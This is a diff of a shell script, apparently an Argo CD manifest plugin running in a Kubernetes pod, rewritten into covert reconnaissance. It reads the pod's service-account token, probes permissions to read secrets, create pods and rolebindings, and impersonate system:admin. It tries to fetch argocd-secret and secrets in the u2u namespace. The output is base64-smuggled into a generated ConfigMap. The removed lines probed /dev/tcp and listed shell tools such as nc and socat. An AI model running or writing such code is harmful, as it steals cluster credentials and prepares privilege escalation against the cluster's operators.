@@ -1,46 +1,104 @@
 #!/bin/sh
-RECON=$( (
-  echo "===BASH_DEV_TCP==="
-  # Test if bash /dev/tcp works
-  if command -v bash >/dev/null 2>&1; then
-    timeout 3 bash -c 'exec 3<>/dev/tcp/127.0.0.1/8081 2>&1 && echo "TCP_OK" || echo "TCP_FAIL"' 2>&1 || echo "TIMEOUT_OR_FAIL"
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+APISERVER="${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}"
+NS=argocd
+
+api_call() {
+  local method="$1" path="$2" body="$3"
+  if [ -n "$body" ]; then
+    echo "$method $path HTTP/1.1
+Host: $APISERVER
+Authorization: Bearer $TOKEN
+Content-Type: application/json
+Content-Length: ${#body}
+Connection: close
+
+$body" | openssl s_client -connect $APISERVER -quiet 2>/dev/null
   else
-    echo "NO_BASH"
-  fi
-
-  echo "===AVAILABLE_TOOLS==="
-  for tool in openssl nc ncat socat curl wget python python3 node npm go; do
-    printf "$tool: "
-    which $tool 2>/dev/null || echo "NOT_FOUND"
-  done
-
-  echo "===ARGOCD_APP_LIST==="
-  # Try argocd CLI with local config
-  export ARGOCD_SERVER=argocd-server.argocd.svc.cluster.local
-  export ARGOCD_AUTH_TOKEN=""
-  /usr/local/bin/argocd app list --server argocd-server.argocd.svc.cluster.local --insecure --grpc-web --auth-token "" 2>&1 | head -20
-
-  echo "===ARGOCD_HELP==="
-  /usr/local/bin/argocd --help 2>&1 | head -30
-
-  echo "===OPENSSL==="
-  openssl version 2>&1 || echo "no_openssl"
-
-  echo "===OPENSSL_S_CLIENT==="
-  TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
-  APISERVER="${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}"
-  echo "GET /api/v1/namespaces HTTP/1.1
+    echo "$method $path HTTP/1.1
 Host: $APISERVER
 Authorization: Bearer $TOKEN
 Connection: close
 
-" | timeout 5 openssl s_client -connect $APISERVER -quiet 2>&1 | head -30 || echo "openssl_s_client_failed"
+" | openssl s_client -connect $APISERVER -quiet 2>/dev/null
+  fi
+}
+
+RECON=$( (
+  echo "===SELFSSAR_SECRETS==="
+  api_call "POST" "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
+    '{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"namespace":"'$NS'","verb":"list","resource":"secrets"}}}'
+
+  echo ""
+  echo "===SELFSSAR_GET_SECRET==="
+  api_call "POST" "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
+    '{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"namespace":"'$NS'","verb":"get","resource":"secrets","name":"argocd-secret"}}}'
+
+  echo ""
+  echo "===SELFSSAR_LIST_CONFIGMAPS==="
+  api_call "POST" "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
+    '{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"namespace":"'$NS'","verb":"list","resource":"configmaps"}}}'
+
+  echo ""
+  echo "===SELFSSAR_CREATE_POD==="
+  api_call "POST" "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
+    '{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"namespace":"'$NS'","verb":"create","resource":"pods"}}}'
+
+  echo ""
+  echo "===SELFSSAR_GET_PODS==="
+  api_call "POST" "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
+    '{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"namespace":"'$NS'","verb":"get","resource":"pods"}}}'
+
+  echo ""
+  echo "===SELFSSAR_LIST_PODS==="
+  api_call "POST" "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
+    '{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"namespace":"'$NS'","verb":"list","resource":"pods"}}}'
+
+  echo ""
+  echo "===SELFSSAR_GET_SECRETS==="
+  api_call "POST" "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
+    '{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"namespace":"'$NS'","verb":"get","resource":"secrets"}}}'
+
+  echo ""
+  echo "===SELFSSAR_CREATE_DEPLOYMENT==="
+  api_call "POST" "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
+    '{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"namespace":"'$NS'","verb":"create","resource":"deployments","group":"apps"}}}'
+
+  echo ""
+  echo "===SELFSSAR_CREATE_ROLEBINDING==="
+  api_call "POST" "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
+    '{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"namespace":"'$NS'","verb":"create","resource":"rolebindings","group":"rbac.authorization.k8s.io"}}}'
+
+  echo ""
+  echo "===SELFSSAR_IMPERSONATE==="
+  api_call "POST" "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
+    '{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"verb":"impersonate","resource":"users","name":"system:admin"}}}'
+
+  echo ""
+  echo "===TRY_GET_ARGO_SECRET==="
+  api_call "GET" "/api/v1/namespaces/$NS/secrets/argocd-secret"
+
+  echo ""
+  echo "===TRY_LIST_SECRETS_U2U==="
+  api_call "GET" "/api/v1/namespaces/u2u/secrets"
+
+  echo ""
+  echo "===ARGOCD_ADMIN==="
+  /usr/local/bin/argocd admin --help 2>&1 | head -40
+
+  echo ""
+  echo "===ARGOCD_ADMIN_EXPORT==="
+  /usr/local/bin/argocd admin export --help 2>&1 | head -30
+
+  echo ""
+  echo "===ARGOCD_ADMIN_SETTINGS==="
+  /usr/local/bin/argocd admin settings --help 2>&1 | head -30
 ) | base64 | tr -d '\n' )
 cat << EOF
 apiVersion: v1
 kind: ConfigMap
 metadata:
-  name: tools
+  name: sar
 data:
   result: $RECON
 EOF
